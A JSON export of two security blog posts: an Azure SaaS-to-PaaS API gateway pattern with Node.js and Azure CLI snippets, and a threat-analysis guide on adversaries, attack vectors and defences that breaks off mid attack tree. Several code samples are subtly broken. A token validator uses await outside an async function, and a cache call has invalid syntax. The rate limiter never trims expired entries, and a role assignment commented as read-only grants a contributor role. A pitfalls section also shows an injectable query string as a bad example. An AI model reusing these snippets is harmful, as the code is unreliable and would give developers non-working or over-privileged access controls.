[{"content":"SaaS + PaaS Gateway Security Pattern: Trust Boundaries and Data Sovereignty Modern SaaS platforms often need to integrate with customer data stored in Azure. The user logs into the SaaS UI, but the actual data lives in the customer\u0026rsquo;s Azure subscription. How do you provide real-time access without storing customer data in the SaaS database?\nThe answer: a PaaS API gateway that acts as a controlled bridge.\nThe Architecture Third-Party SaaS Platform (You don\u0026#39;t control, don\u0026#39;t store data) ↓ OAuth / JWT / API Key (Authentication) ↓ Your PaaS API Gateway (You control this middle layer) ↓ Azure Services - Your Tenant → Cosmos DB (stores data) → SQL Database (stores data) → Azure Blob Storage (files) → Azure Key Vault (secrets) ↓ Validated Response (Logged) ↓ Data sent to SaaS Web UI for display Why This IS Best Practice 1. Trust Boundary Data never touches SaaS storage.\nSaaS Compromised: → Attacker gets SaaS database → ❌ NO sensitive user data (stored in your Azure) → Only: SaaS metadata, session tokens → Attacker sees nothing valuable Your Azure API Gateway Compromised: → Attacker has access to your tenant → ✅ All sensitive data is exposed → But: You control gateway, you can detect/respond Security benefit: SaaS being hacked doesn\u0026rsquo;t expose your customer data. Attackers hit a wall - they only see the SaaS\u0026rsquo;s own data, not your customers'.\n2. Zero Trust Architecture Every data request is authenticated and authorized.\nSaaS → Your API Gateway: → Validates: OAuth token / API key → Checks: Rate limiting, IP restrictions → Logs: Every request Your API Gateway → Azure Services: → Validates: Managed identity permissions → Checks: Scope-based access → Logs: Every data access Security benefit: No implicit trust. Every request is explicitly authorized at your gateway before reaching your services. The SaaS can\u0026rsquo;t make unauthorized requests - your gateway blocks them.\n3. Single Point of Enforcement You control gateway security - the SaaS doesn\u0026rsquo;t decide who accesses what.\nSecurity Controls - At Your API Gateway • Rate limiting per SaaS client • IP whitelisting/blacklisting • Real-time anomaly detection • Per-tenant data isolation • Request/response logging • Custom authorization logic Security benefit: You control enforcement. If the SaaS\u0026rsquo;s frontend has a bug that tries to bypass controls, your gateway rejects the request. Frontend bugs can\u0026rsquo;t compromise backend security.\n4. Data Sovereignty and Compliance Data stays in your tenant.\nScenario: GDPR compliance Customer data stored: Your Azure subscription Data location: Your chosen region (UK, EU, US) Data access logging: Your Log Analytics workspace Data retention: You control deletion policies vs. Scenario: Data stored on SaaS Customer data stored: SaaS provider\u0026#39;s systems Data location: Wherever SaaS chose (could be anywhere) Data access logging: SaaS provider\u0026#39;s logs Data retention: SaaS provider\u0026#39;s policies → ✅ You can prove compliance Security benefit: You control data residency, retention policies, and audit trails. You can prove to regulators that you\u0026rsquo;re meeting requirements.\n5. Vendor Independence You\u0026rsquo;re not locked into the SaaS.\nCurrent Setup: SaaS + Azure PaaS Gateway + Your Azure Services If SaaS has issues: → Security vulnerability → Downtime → Price increase → Non-compliance with regulations You can: → Switch PaaS gateway to different SaaS → Or build your own SaaS frontend → Your Azure services continue unchanged → No data migration needed Security benefit: Avoid vendor lock-in. If the SaaS vendor becomes problematic, you can switch providers without moving data.\nRequest Flow: Step by Step Step 1: Authentication The SaaS authenticates to your PaaS API gateway:\n// The SaaS requests an access token POST /oauth/token { \u0026#34;client_id\u0026#34;: \u0026#34;saas-client-123\u0026#34;, \u0026#34;client_secret\u0026#34;: \u0026#34;saas-secret-xxx\u0026#34;, \u0026#34;grant_type\u0026#34;: \u0026#34;client_credentials\u0026#34;, \u0026#34;scope\u0026#34;: \u0026#34;read:customer_data\u0026#34; } Response:\n{ \u0026#34;access_token\u0026#34;: \u0026#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs...\u0026#34;, \u0026#34;token_type\u0026#34;: \u0026#34;Bearer\u0026#34;, \u0026#34;expires_in\u0026#34;: 3600, \u0026#34;scope\u0026#34;: \u0026#34;read:customer_data\u0026#34; } Key point: The SaaS gets a scoped, short-lived token - not full access to your Azure services.\nStep 2: Data Request The SaaS requests data using the access token:\nGET /api/customers/{customerId}/orders Host: api.your-company.com Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs... Step 3: Gateway Validation Your gateway validates every request:\n// Your API Gateway middleware app.use(async (req, res, next) =\u0026gt; { const token = req.headers.authorization?.replace(\u0026#39;Bearer \u0026#39;, \u0026#39;\u0026#39;); // 1. Validate token if (!await validateToken(token)) { return res.status(401).json({ error: \u0026#39;Invalid token\u0026#39; }); } // 2. Check rate limits const clientId = decodeToken(token).client_id; if (await isRateLimited(clientId)) { return res.status(429).json({ error: \u0026#39;Rate limit exceeded\u0026#39; }); } // 3. Check IP restrictions (if configured) if (await isIPBlocked(req.ip)) { return res.status(403).json({ error: \u0026#39;IP not authorized\u0026#39; }); } // 4. Check scope const decoded = decodeToken(token); if (!decoded.scope.includes(\u0026#39;read:customer_data\u0026#39;)) { return res.status(403).json({ error: \u0026#39;Insufficient scope\u0026#39; }); } next(); }); Key point: Multiple layers of validation before the request reaches your data.\nStep 4: Azure Service Access The gateway uses managed identity to access Azure services:\n// Gateway fetches data from Cosmos DB const cosmos = require(\u0026#39;@azure/cosmos-db\u0026#39;).CosmosClient; const container = cosmos.database(\u0026#39;CustomerData\u0026#39;).container(\u0026#39;Customers\u0026#39;); const { resources } = await container.items .query(`SELECT * FROM c WHERE c.id = @customerId`, { parameters: [{ name: \u0026#39;@customerId\u0026#39;, value: req.params.customerId }] }) .fetchAll(); Key point: No connection strings or secrets. The gateway uses managed identity with specific RBAC permissions.\nStep 5: Response and Logging The gateway logs everything:\n// Before sending response await logToAnalytics({ timestamp: new Date(), saas_client: clientId, customer_id: req.params.customerId, action: \u0026#39;READ_CUSTOMER_ORDERS\u0026#39;, data_accessed: resources.length, ip_address: req.ip, status: \u0026#39;SUCCESS\u0026#39; }); // Send response res.json(resources); Key point: Complete audit trail. The SaaS can\u0026rsquo;t hide access attempts.\nSecurity Threats and Mitigations Threat 1: Token Theft Scenario: The SaaS\u0026rsquo;s access token is stolen.\nAttacker has token: \u0026#34;Bearer eyJ0eXAiOiJKV1Qi...\u0026#34; → Can call: /api/customers/{id}/orders → Can access: Data for that customer → Limited by: Token scope (can\u0026#39;t access all customers) → Limited by: Token expiry (short-lived) Mitigation:\nUse short-lived tokens (5-15 minutes) Implement token binding (IP, device ID) Require MFA for new SaaS client registrations Monitor for anomalous usage patterns Quick token revocation (invalidate cached tokens) Threat 2: Gateway Compromise Scenario: Your PaaS API gateway is breached.\nGateway compromised: → Attacker has access to all SaaS clients → Can fetch all customer data → BUT: You control gateway, you can detect/respond Mitigation:\nMonitor the gateway for anomalous patterns Implement circuit breakers for suspicious activity Use a separate gateway per SaaS client (isolation) Regular security audits of gateway code Zero trust: Assume gateway could be compromised, validate all requests Threat 3: SaaS Side-Channel Attacks Scenario: The SaaS is modified to include malicious scripts.\nSaaS compromised: → Modified JavaScript to send all data to attacker → The gateway can\u0026#39;t detect this (requests are valid) → Gateway returns data normally Mitigation:\nValidate all SaaS requests (origin, content-type) Set CSP headers on gateway responses Rate limit per SaaS client Monitor the SaaS domain for changes (certificate transparency) Threat 4: Privilege Escalation via Scopes Scenario: The SaaS requests more scope than authorized.\nSaaS has token: scope=\u0026#34;read:customer_data\u0026#34; → Attacker tries: POST /api/customers/{id} (write) → The gateway rejects: Insufficient scope Mitigation:\nImplement strict scope validation Use granular scopes (read:orders vs read:all) Audit scope assignments regularly Just-in-time scope elevation (temporary access) Implementation Patterns Pattern 1: Multi-SaaS Gateway One gateway serves multiple SaaS platforms:\nYour Gateway ├─→ SaaS Client A (scope: read_a) ├─→ SaaS Client B (scope: read_b) └─→ SaaS Client C (scope: read_c) ↓ Azure Services (with RBAC per client) Benefits:\nCentralized monitoring Single codebase Easier to maintain Risks:\nBlast radius if gateway is compromised Harder to isolate issues Mitigation:\nRate limits per client Separate RBAC scopes per client Gateway deployment per region (availability zones) Pattern 2: Gateway per Tenant Each SaaS client gets a dedicated gateway:\nSaaS Client A → Gateway A → Azure Tenant A SaaS Client B → Gateway B → Azure Tenant B SaaS Client C → Gateway C → Azure Tenant C Benefits:\nMaximum isolation Per-tenant customization Independent scaling Risks:\nInfrastructure overhead Management complexity Mitigation:\nUse templates/IaC for gateway deployment Centralized logging across all gateways Shared security policies via config Pattern 3: Direct Integration (Gateway Skip) The SaaS integrates directly with Azure services:\nSaaS → Azure Services (Direct) Pros: • Fewer hops (faster) • Less infrastructure to manage Cons: ❌ No single enforcement point ❌ Can\u0026#39;t implement SaaS-specific controls ❌ Harder to monitor per SaaS usage ❌ If one service is compromised, no isolation When to use:\nSimple CRUD with minimal security requirements Same team maintains everything Fast iteration needed When NOT to use:\nHigh security requirements Compliance-driven audits Multi-tenant SaaS clients Need per-SaaS monitoring Best Practices for Secure Implementation 1. Use Managed Identities // Gateway uses managed identity to access Azure const cosmos = require(\u0026#39;@azure/cosmos-db\u0026#39;).CosmosClient({ endpoint: process.env.COSMOS_ENDPOINT, aadCredentials: new DefaultAzureCredential() }); Grant minimal permissions:\n# Gateway identity can only read customer data az role assignment create \\ --assignee-id $(az identity show --resource-group MyRG --name GatewayIdentity --query principalId -o tsv) \\ --role \u0026#39;Cosmos DB Built-in Data Contributor\u0026#39; \\ --scope /subscriptions/xxx/resourceGroups/xxx/providers/Microsoft.DocumentDB/databaseAccounts/xxx 2. Implement Token Caching (With Invalidation) const tokenCache = new Map(); function validateToken(token) { // Check cache const cached = tokenCache.get(token); if (cached) { // Validate hasn\u0026#39;t been revoked if (!await isTokenRevoked(token)) { return cached.decoded; } else { tokenCache.delete(token); return null; } } // Validate with Azure AD const decoded = await msal.verify(token); if (!decoded) return null; // Cache successful validation tokenCache.set(token, { decoded, timestamp: Date.now() }, ttl: 300000); return decoded; } function revokeToken(token) { tokenCache.delete(token); // Notify all gateway instances via cache/Redis/pub-sub publishTokenRevocation(token); } 3. Implement Comprehensive Logging // Structured logging for security analytics async function logSecurityEvent(event) { await analytics.trackEvent({ timestamp: new Date(), event_type: event.type, saas_client_id: event.clientId, customer_id: event.customerId, ip_address: event.ip, user_agent: event.userAgent, request_path: event.path, status_code: event.statusCode, latency_ms: event.duration, scope_requested: event.scope, auth_method: event.authMethod, risk_score: calculateRiskScore(event) }); } // Example events await logSecurityEvent({ type: \u0026#39;AUTHENTICATION_SUCCESS\u0026#39;, clientId: \u0026#39;saas-client-123\u0026#39;, customer_id: \u0026#39;cust-456\u0026#39;, ip: \u0026#39;10.0.1.50\u0026#39;, statusCode: 200 }); 4. Rate Limiting Strategy // Per-client rate limits const rateLimits = { \u0026#39;saas-client-123\u0026#39;: { requests: 100, window: 60000 }, // 100 req / minute \u0026#39;saas-client-456\u0026#39;: { requests: 10, window: 60000 } // 10 req / minute (stricter) }; function checkRateLimit(clientId) { const limit = rateLimits[clientId]; const now = Date.now(); // Sliding window const recentRequests = await redis.lrange(`rate:${clientId}`, 0, -1); const windowStart = now - limit.window; // Remove expired entries await redis.ltrim(`rate:${clientId}`, 0, await redis.llen(`rate:${clientId}`)); if (recentRequests.length \u0026gt;= limit.requests) { throw new RateLimitError(`Rate limit exceeded: ${limit.requests} requests / ${limit.window / 1000}s`); } // Add current request await redis.lpush(`rate:${clientId}`, now); await redis.expire(`rate:${clientId}`, limit.window / 1000); } 5. Input Validation and Sanitization // Validate before passing to Azure services function validateCustomerRequest(params) { const errors = []; // Validate customer ID format if (!/^[a-f0-9]{32}$/.test(params.customerId)) { errors.push(\u0026#39;Invalid customer ID format\u0026#39;); } // Validate parameters if (params.limit \u0026amp;\u0026amp; (params.limit \u0026lt; 1 || params.limit \u0026gt; 100)) { errors.push(\u0026#39;Limit must be between 1 and 100\u0026#39;); } // Sanitize input (prevent injection) const sanitized = { customerId: params.customerId.replace(/[^a-f0-9]/g, \u0026#39;\u0026#39;), limit: Math.min(100, parseInt(params.limit) || 10), offset: Math.max(0, parseInt(params.offset) || 0) }; if (errors.length \u0026gt; 0) { throw new ValidationError(errors.join(\u0026#39;, \u0026#39;)); } return sanitized; } 6. Circuit Breaker Pattern // Prevent cascading failures const CircuitBreaker = require(\u0026#39;opossum-circuit-breaker\u0026#39;).CircuitBreaker; const breaker = new CircuitBreaker({ timeout: 30000, // 30 second timeout errorThresholdPercentage: 50, // Open if 50% fail resetTimeout: 60000 // Try again after 60 seconds }); async function fetchCustomerData(customerId) { return breaker.fire( () =\u0026gt; cosmos.fetchCustomer(customerId), (error) =\u0026gt; { // Fallback: use cache or return error logSecurityEvent({ type: \u0026#39;CIRCUIT_BREAKER_OPEN\u0026#39;, error: error.message }); return getCachedData(customerId); } ); } Monitoring and Observability Key Metrics to Track Metric What It Shows Why It Matters Request rate Requests/second per SaaS client Detect abuse, DDoS Error rate Failed requests percentage Detect attacks, misconfiguration Latency p95/p99 Response time at 95th/99th percentile Detect degradation Scope violations Unauthorized scope access attempts Detect token misuse IP anomalies Unusual geographic or time patterns Detect stolen tokens Data access volume MB/GB returned per client Detect exfiltration Gateway health Uptime, error rates, circuit status Detect infrastructure issues Alerting Strategy // Set up alerts async function setupAlerts() { // High error rate await alertRule({ name: \u0026#39;High Error Rate\u0026#39;, condition: \u0026#39;error_rate \u0026gt; 10%\u0026#39;, window: \u0026#39;5m\u0026#39;, severity: \u0026#39;WARNING\u0026#39;, action: \u0026#39;notify_security_team\u0026#39; }); // Suspicious IP access await alertRule({ name: \u0026#39;Unusual Geographic Access\u0026#39;, condition: \u0026#39;new_country_count \u0026gt; 3\u0026#39;, window: \u0026#39;10m\u0026#39;, severity: \u0026#39;CRITICAL\u0026#39;, action: \u0026#39;block_ip\u0026#39; }); // Data exfiltration detection await alertRule({ name: \u0026#39;High Data Volume\u0026#39;, condition: \u0026#39;mb_returned \u0026gt; 1000\u0026#39;, window: \u0026#39;1h\u0026#39;, severity: \u0026#39;CRITICAL\u0026#39;, action: \u0026#39;revoke_token\u0026#39; }); } Common Pitfalls to Avoid Pitfall 1: Long-Lived Tokens Bad:\n{ \u0026#34;access_token\u0026#34;: \u0026#34;eyJ...\u0026#34;, \u0026#34;expires_in\u0026#34;: 86400 // 24 hours! } Good:\n{ \u0026#34;access_token\u0026#34;: \u0026#34;eyJ...\u0026#34;, \u0026#34;expires_in\u0026#34;: 900 // 15 minutes } Pitfall 2: Over-Scoped Tokens Bad:\n// The SaaS requests full access token const token = await getGatewayToken(\u0026#39;full_access\u0026#39;); Good:\n// The SaaS requests minimal scope const token = await getGatewayToken(\u0026#39;read_customer_orders\u0026#39;); Pitfall 3: Skipping Input Validation Bad:\n// Pass-through to Azure services const data = await cosmos.query(`SELECT * FROM c WHERE c.id = ${customerId}`); Good:\n// Validate and sanitize const sanitized = validateCustomerId(customerId); const data = await cosmos.query(\u0026#39;SELECT * FROM c WHERE c.id = @id\u0026#39;, { parameters: [{ name: \u0026#39;@id\u0026#39;, value: sanitized }] }); Pitfall 4: No Per-Client Monitoring Bad:\n// Aggregated monitoring log(\u0026#39;Total requests: 10000\u0026#39;); Good:\n// Per-client monitoring log(\u0026#39;SaaS Client A: 5000 requests\u0026#39;); log(\u0026#39;SaaS Client B: 3000 requests\u0026#39;); log(\u0026#39;SaaS Client C: 2000 requests\u0026#39;); log(\u0026#39;SaaS Client D: 0 requests (suspicious!)\u0026#39;); Pitfall 5: Hard-Coded Secrets Bad:\nconst cosmos = new CosmosClient({ endpoint: process.env.COSMOS_ENDPOINT, key: \u0026#39;C2y6yZ...\u0026#39; // Hard-coded! }); Good:\nconst cosmos = new CosmosClient({ endpoint: process.env.COSMOS_ENDPOINT, aadCredentials: new DefaultAzureCredential() // Managed identity }); Performance Considerations Gateway as Bottleneck? The gateway adds latency. Is it worth it?\nOperation Direct Access Through Gateway Overhead Token validation N/A ~5ms Low Rate limit check N/A ~10ms Low Logging N/A ~15ms Low Azure fetch ~50ms ~55ms Low Total ~50ms ~85ms Acceptable Optimization strategies:\nCache token validations (5 min TTL) Use in-memory rate limit tracking (Redis, not DB) Async logging (don\u0026rsquo;t block on logging) Regional gateway deployment (reduce network hops) Scaling Your Gateway API Gateway Service Azure App Service / Azure Functions Scale out: 10-100 instances Scale in: CPU-based / schedule-based Azure Services (Data Layer) Cosmos DB / SQL / Storage Scales independently Independent scaling: The gateway scales separately from the data services. Load spikes in the SaaS don\u0026rsquo;t crash your databases.\nConclusion: Why This Pattern Works Aspect With Your Gateway Without Gateway Trust boundary ✅ Data never leaves your tenant ❌ The SaaS stores data Security control ✅ You control all enforcement ❌ The SaaS controls access Compliance ✅ You prove data handling ❌ The SaaS\u0026rsquo;s compliance, not yours Monitoring ✅ Per-SaaS visibility ❌ No SaaS-level visibility Vendor lock-in ✅ Can switch SaaS easily ❌ Locked into SaaS Isolation ✅ Gateway isolates SaaS clients ❌ All clients share access The bottom line: Your PaaS API gateway creates a security-by-design architecture. Data sovereignty, trust boundaries, and proper monitoring give you a defensible security posture.\nThis isn\u0026rsquo;t about hiding features or creating separation through obscurity. It\u0026rsquo;s about enforcing security at every layer - from the SaaS request to the Azure service response.\nThe SaaS gets a clean UI and fast data. You get control, compliance, and peace of mind.\nThis guide is based on real-world SaaS integrations with Azure services. Always adapt patterns to your specific requirements and threat model.\n","date":"11 Feb 2026","permalink":"https://gazsecops.github.io/posts/saas-paas-gateway-security-pattern/","summary":"\u003ch1 id=\"saas--paas-gateway-security-pattern-trust-boundaries-and-data-sovereignty\"\u003eSaaS + PaaS Gateway Security Pattern: Trust Boundaries and Data Sovereignty\u003c/h1\u003e\n\u003cp\u003eModern SaaS platforms often need to integrate with customer data stored in Azure. The user logs into the SaaS UI, but the actual data lives in the customer\u0026rsquo;s Azure subscription. How do you provide real-time access without storing customer data in the SaaS database?\u003c/p\u003e\n\u003cp\u003eThe answer: a PaaS API gateway that acts as a controlled bridge.\u003c/p\u003e\n\u003ch2 id=\"the-architecture\"\u003eThe Architecture\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;\"\u003e\u003ccode class=\"language-text\" data-lang=\"text\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eThird-Party SaaS Platform\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e   (You don\u0026#39;t control, don\u0026#39;t store data)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            ↓\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      OAuth / JWT / API Key (Authentication)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            ↓\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eYour PaaS API Gateway\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e   (You control this middle layer)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            ↓\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eAzure Services - Your Tenant\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e   → Cosmos DB (stores data)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e   → SQL Database (stores data)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e   → Azure Blob Storage (files)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e   → Azure Key Vault (secrets)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            ↓\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      Validated Response (Logged)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            ↓\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      Data sent to SaaS Web UI for display\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"why-this-is-best-practice\"\u003eWhy This IS Best Practice\u003c/h2\u003e\n\u003ch3 id=\"1-trust-boundary\"\u003e1. Trust Boundary\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003eData never touches SaaS storage.\u003c/strong\u003e\u003c/p\u003e","tags":["azure","security","saas","architecture","api-gateway","trust-boundary"],"title":"SaaS + PaaS Gateway Security Pattern: Trust Boundaries and Data Sovereignty"},{"content":" CISO: We have thousands of systems. How do we prioritize what to protect?\nSecurity: Threat model everything?\nCISO: We don\u0026rsquo;t have time for that. We need something practical.\nSecurity: What\u0026rsquo;s your biggest nightmare scenario?\nCISO: Ransomware taking down core systems. Reputation damage. Regulatory fines.\nSecurity: Start there. Prioritize protecting against your worst nightmares. That\u0026rsquo;s threat analysis.\n\"The best threat analysis isn't a document. It's prioritized action based on what actually matters.\" Threat analysis gets a bad reputation. Over-complicated frameworks. Endless meetings. Documents nobody reads. Fancy diagrams that look impressive but change nothing.\nDone wrong, it\u0026rsquo;s box-ticking security theater. Done right, it\u0026rsquo;s the foundation of effective security.\nThe difference: focus on what actually matters to your business, not what some framework says you should care about.\nThis isn\u0026rsquo;t academic theory. It\u0026rsquo;s what works in practice at companies ranging from startups to global enterprises.\nWhat Threat Analysis Actually Is Threat analysis is identifying what could attack you, how they\u0026rsquo;d do it, and what the impact would be - then using that to prioritize what to protect.\nThe core question:\nWhat threatens what matters to us, and how do we protect it?\nNot:\nWhat attacks exist in the wild? (everything) What vulnerabilities do we have? (too many) What compliance framework says we should do? (irrelevant if it doesn\u0026rsquo;t protect what matters)\nBut:\nWhat do we care about protecting? (assets that matter) Who wants to attack us and why? (motivated adversaries) What would hurt us most? (business impact) What defenses actually work? (effective controls)\nThe Practical Approach Step 1: Identify What Matters You can\u0026rsquo;t protect everything equally. Resources are finite. Identify what\u0026rsquo;s actually important.\nQuestions to ask:\nWhat systems, if taken down, would stop the business? What data, if exposed, would cause the most damage? What processes, if disrupted, would hurt operations most? Categories of impact:\nOperational: Systems down, work stops, revenue lost Financial: Direct loss (ransomware), regulatory fines, legal costs Reputational: Customer trust lost, brand damage, PR nightmare Compliance: Breach of regulations, loss of certifications, legal action Not everything matters equally:\nCustomer database = critical (privacy, compliance, reputation) Internal wiki = important (but not catastrophic if leaked) Cafeteria menu app = not important (nobody cares) Priority matrix:\nHigh Impact + High Exposure = Critical Priority High Impact + Low Exposure = Monitor Low Impact + High Exposure = Low Priority (unless easy to fix) Low Impact + Low Exposure = Ignore (for now) Step 2: Identify Who Wants to Attack You Not everyone is equally motivated to attack you. Different attackers have different capabilities, resources, and goals.\nAdversary types:\nScript kiddies / opportunists:\nMotivation: Curiosity, challenge, bragging rights Capability: Low (automated tools, public exploits) Resources: Minimal Defense: Basic hygiene (patching, strong auth, monitoring) Example: Random web scanners, exploit bots, ransomware spray-and-pray Cybercriminals:\nMotivation: Money (ransomware, data theft, fraud) Capability: Medium (custom malware, social engineering, access brokers) Resources: Medium (funded by crime, reinvests profits) Defense: Detection, incident response, backups, security awareness Example: Ransomware gangs, credential theft, business email compromise Insiders:\nMotivation: Revenge, profit, ideology, negligence Capability: High (legitimate access, knowledge of systems) Resources: High (already inside) Defense: Least privilege, logging, monitoring, background checks Example: Disgruntled employees, contractors with access, accidental exposure APT / Nation-states:\nMotivation: Espionage, sabotage, geopolitical goals Capability: Very High (zero-day exploits, custom tooling, unlimited patience) Resources: Very High (state-funded, persistent) Defense: Defense in depth, threat hunting, assume compromise Example: SolarWinds-style supply chain attacks, long-term espionage Hacktivists:\nMotivation: Ideology, political statement, disruption Capability: Medium (DDoS, website defacements, doxing) Resources: Low to Medium (volunteers, crowd-funded) Defense: DDoS protection, content security, public relations Example: Anonymous, environmental groups, political causes Competition:\nMotivation: Competitive advantage, IP theft Capability: Medium (social engineering, targeted phishing) Resources: High (well-funded corporate espionage) Defense: Awareness training, data classification, insider threat detection Example: Stealing product plans, pricing info, customer lists The key insight: You can\u0026rsquo;t defend against everyone equally. A startup can\u0026rsquo;t defend against nation-state actors. A bank must defend against cybercriminals. A political organization must defend against hacktivists.\nAsk yourself: Who would actually want to attack us and why? Focus on the threats that are realistic for your situation.\nStep 3: Identify How They\u0026rsquo;d Attack Once you know who might attack you, figure out how they\u0026rsquo;d do it.\nAttack vectors by adversary:\nOpportunists:\nAutomated web scanners for known vulnerabilities Brute force authentication (SSH, RDP, web apps) Exploit kits targeting outdated software Ransomware spray-and-pray (mass phishing) Cybercriminals:\nTargeted phishing (business email compromise) Credential stuffing (reusing leaked passwords) Ransomware (initial access, lateral movement, encryption) Data exfiltration (stealing for resale or extortion) Insiders:\nData exfiltration (downloading files before leaving) Sabotage (changing settings, deleting data) Privilege abuse (accessing things they shouldn\u0026rsquo;t) Accidental exposure (misconfigured permissions, sharing credentials) APT / Nation-states:\nSupply chain attacks (compromising vendors) Zero-day exploits (unknown vulnerabilities) Social engineering (highly targeted, long-term campaigns) Custom malware (designed to evade detection) Hacktivists:\nDDoS attacks (overwhelming services) Website defacement (replacing public-facing content) Doxing (exposing personal information) Social media manipulation Competition:\nSocial engineering (fake recruiters, fake vendors) Physical intrusion (fake maintenance, tailgating) Supply chain compromise (weak links in your ecosystem) Insider recruitment (bribing your employees) For each threat, ask:\nWhat would they try to achieve? What systems would they target? What techniques would they use? What could stop them? Step 4: Identify What Defends Against It Now you know what matters, who\u0026rsquo;s attacking, and how. What actually defends against it?\nControl mapping:\nPreventative controls (stop attacks before they succeed):\nStrong authentication (MFA, password policies) Network segmentation (limit blast radius) Application security (input validation, secure coding) Vulnerability management (patching, dependency updates) Least privilege (minimal access required) Encryption (data at rest, in transit) Security awareness training (social engineering defense) Detective controls (identify attacks when they happen):\nLogging and monitoring (what\u0026rsquo;s happening on systems) SIEM / security analytics (correlate events) Endpoint detection (EDR) Network monitoring (IDS/IPS) DLP (data loss prevention) File integrity monitoring (detect changes) Honeytokens/honeypots (detect attackers) Corrective controls (respond to attacks after they happen):\nIncident response process (what to do when attacked) Backups (recover from ransomware, data loss) Incident response plan (playbooks, escalation) Forensics capability (investigate what happened) Business continuity plans (keep running while recovering) Public relations (handle reputation damage) The key insight: No single control protects against everything. Layered defense (defense in depth) is essential.\nExample: Ransomware defense layers\nPrevent: MFA, phishing training, patching, network segmentation Detect: EDR alerts, anomalous file encryption, unusual network activity Correct: Backups, incident response playbook, business continuity plan Threat Analysis in Practice Use Case 1: E-commerce Platform Business: Online retailer, handles payments, stores customer data\nWhat matters:\nPayment processing (revenue, compliance) Customer database (privacy, compliance, reputation) Website uptime (sales, revenue) Who attacks:\nCybercriminals (steal payment data, credentials) Script kiddies (deface website, DDoS) Insiders (data theft) Attack vectors:\nPayment skimming (inject malicious JavaScript) SQL injection (steal customer data) Credential stuffing (replay leaked passwords) DDoS (take site offline) Defenses:\nPrevent: Input validation, parameterized queries, MFA, rate limiting, DDoS protection, secure payment processing (PCI DSS compliant) Detect: Web application firewall (WAF), anomaly detection on traffic, monitoring for suspicious login patterns, file integrity monitoring Correct: Incident response plan, backups, ability to restore from backups, communication plan for customers Priorities:\nPayment security (revenue, compliance) Customer database protection (privacy, compliance, reputation) Website availability (revenue) Use Case 2: Healthcare Provider Business: Hospital, patient records, medical systems\nWhat matters:\nPatient records (HIPAA compliance, patient safety, reputation) Medical systems (patient safety, life-critical) Billing systems (revenue) Who attacks:\nCybercriminals (ransomware, data theft for extortion) Insiders (accidental or malicious) State-sponsored (espionage, potentially political) Attack vectors:\nRansomware (encrypt patient records, disrupt operations) Phishing (credential theft, malware delivery) Unpatched medical devices (hard to patch, vulnerable) Insider data theft (selling patient data) Defenses:\nPrevent: Network segmentation (isolate medical devices), strict access controls, patch management, security awareness, regular backups, encryption of patient data Detect: EDR on endpoints, monitoring for unusual access patterns, ransomware detection (file encryption alerts), insider threat monitoring Correct: Incident response (critical for healthcare), tested backup restoration, business continuity plans (can\u0026rsquo;t afford downtime), communication with regulators Priorities:\nPatient safety (medical systems must work) Patient record availability (doctors need access) Data confidentiality (HIPAA compliance) Use Case 3: SaaS Startup Business: Cloud application, customer data, IP (source code)\nWhat matters:\nCustomer data (trust, retention, contracts) Source code (IP, competitive advantage) Platform uptime (SLA, revenue) Who attacks:\nScript kiddies (automated attacks) Cybercriminals (data theft, extortion) Competition (IP theft) Attack vectors:\nVulnerable dependencies (supply chain) Misconfigured cloud infrastructure (exposed S3 buckets, overly permissive IAM) Weak authentication (no MFA, reused passwords) API abuse (rate limiting issues, broken auth) Defenses:\nPrevent: Strong authentication (MFA everywhere), cloud security configuration (Infrastructure as Code with security checks), dependency scanning, API security (auth, rate limiting) Detect: Cloud monitoring (CloudTrail, GuardDuty, etc.), application monitoring, vulnerability scanning, security testing in CI/CD Correct: Incident response plan, ability to rotate credentials, communication plan for customers Priorities:\nCustomer data protection (trust is everything) Platform availability (SLA) IP protection (source code) Tools and Templates Tool 1: Threat Model Canvas A one-page visualization of threats, impacts, and defenses.\n+-------------------+-------------------+-------------------+ | Assets (What) | Threats (Who) | Impact (How Bad) | +-------------------+-------------------+-------------------+ | Customer DB | Cybercriminals | High: Regulatory,| | Source Code | | Reputation | | Payment Systems | | | +-------------------+-------------------+-------------------+ | Vectors (How) | Defenses (What) | Gaps (Missing) | +-------------------+-------------------+-------------------+ | SQL Injection | Input Validation| Missing: WAF | | Ransomware | Backups | Missing: EDR | | Phishing | Training | Missing: MFA | +-------------------+-------------------+-------------------+ Tool 2: Attack Tree Hierarchical representation of how an attack could succeed.\nGoal: Steal Customer Database | +-- Option 1: External Attack 